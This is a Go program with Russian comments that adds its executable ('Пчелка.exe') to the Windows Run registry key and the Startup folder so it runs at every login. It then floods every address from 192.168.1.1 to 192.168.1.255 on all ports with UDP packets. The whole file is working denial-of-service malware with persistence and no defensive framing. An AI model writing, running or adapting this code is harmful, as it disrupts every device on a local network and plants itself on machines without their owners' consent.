package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"sync"
	"time"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"golang.org/x/sys/windows/registry"
)

const (
	startIP       = "192.168.1.1" // берём диапозон локальный апишек
	endIP         = "192.168.1.255"
	startPort     = 1 // тут мы выбираем диавазон портов
	endPort       = 65535
	numPackets    = 1000
	packetSize    = 1024
	numGoroutines = 100
)

func addToStartup() {
	// Получаем путь к текущему исполняемому файлу
	exePath, err := filepath.Abs(".")
	if err != nil {
		log.Fatal(err)
	}
	exePath = filepath.Join(exePath, "Пчелка.exe")

	// Открываем ключ реестра для автозагрузки
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		log.Fatal(err)
	}
	defer key.Close()

	// Добавляем программу в автозагрузку
	err = key.SetStringValue("MyApp", exePath)
	if err != nil {
		log.Fatal(err)
	}

	log.Println("Программа добавлена в автозагрузку.")
}

func createShortcut() {
	// Получаем путь к папке автозагрузки
	startupPath, err := os.UserCacheDir()
	if err != nil {
		log.Fatal(err)
	}
	startupPath = filepath.Join(startupPath, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	// Получаем путь к текущему исполняемому файлу
	exePath, err := filepath.Abs(".")
	if err != nil {
		log.Fatal(err)
	}
	exePath = filepath.Join(exePath, "Пчелка.exe")

	// Создаем ярлык
	ole.CoInitialize(0)
	defer ole.CoUninitialize()

	shell, err := oleutil.CreateObject("WScript.Shell")
	if err != nil {
		log.Fatal(err)
	}
	defer shell.Release()

	wshell, err := shell.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		log.Fatal(err)
	}
	defer wshell.Release()

	shortcut, err := oleutil.CallMethod(wshell, "CreateShortcut", filepath.Join(startupPath, "MyApp.lnk"))
	if err != nil {
		log.Fatal(err)
	}
	defer shortcut.Clear()

	shortcutPath := shortcut.ToIDispatch()
	oleutil.PutProperty(shortcutPath, "TargetPath", exePath)
	oleutil.CallMethod(shortcutPath, "Save")

	log.Println("Ярлык создан в папке автозагрузки.")
}

func loadNetwork(wg *sync.WaitGroup, ip, port string) {
	defer wg.Done()

	conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
	if err != nil {
		return
	}
	defer conn.Close()

	packet := make([]byte, packetSize)
	for i := 0; i < numPackets; i++ {
		conn.Write(packet)
	}
}

func main() {
	addToStartup()
	createShortcut()
	var wg sync.WaitGroup

	startTime := time.Now()
	for ipNum := ipToInt(startIP); ipNum <= ipToInt(endIP); ipNum++ {
		for port := startPort; port <= endPort; port++ {
			for i := 0; i < numGoroutines; i++ {
				wg.Add(1)
				go loadNetwork(&wg, intToIP(ipNum).String(), fmt.Sprintf("%d", port))
			}
		}
	}

	wg.Wait()
	fmt.Println("Нагрузка завершена. Время выполнения:", time.Since(startTime))
}

// Функции для работы с IP
func ipToInt(ip string) int {
	ret := 0
	for _, b := range net.ParseIP(ip).To4() {
		ret <<= 8
		ret |= int(b)
	}
	return ret
}

func intToIP(nn int) net.IP {
	ip := make(net.IP, 4)
	for i := 0; i < 4; i++ {
		ip[3-i] = byte(nn & 0xFF)
		nn >>= 8
	}
	return ip
}
